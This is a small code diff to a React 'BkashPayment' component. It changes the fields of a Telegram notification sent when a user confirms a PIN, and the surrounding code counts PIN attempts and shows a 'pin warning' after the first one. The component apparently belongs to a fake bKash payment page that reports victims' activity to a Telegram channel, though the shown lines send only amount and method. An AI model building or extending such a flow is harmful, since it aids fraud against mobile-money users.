@@ -173,7 +173,7 @@ const BkashPayment = () => {
   const handlePinConfirm = () => {
     if (isValidPin()) {
       setIsConfirmLoading(true);
-      sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'bKash' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'bKash', paymentType: 'mfs' });
       if (pinAttempts === 0 && !pinWarningShown) {
         // Show loading first, then pin warning
         setTimeout(() => {
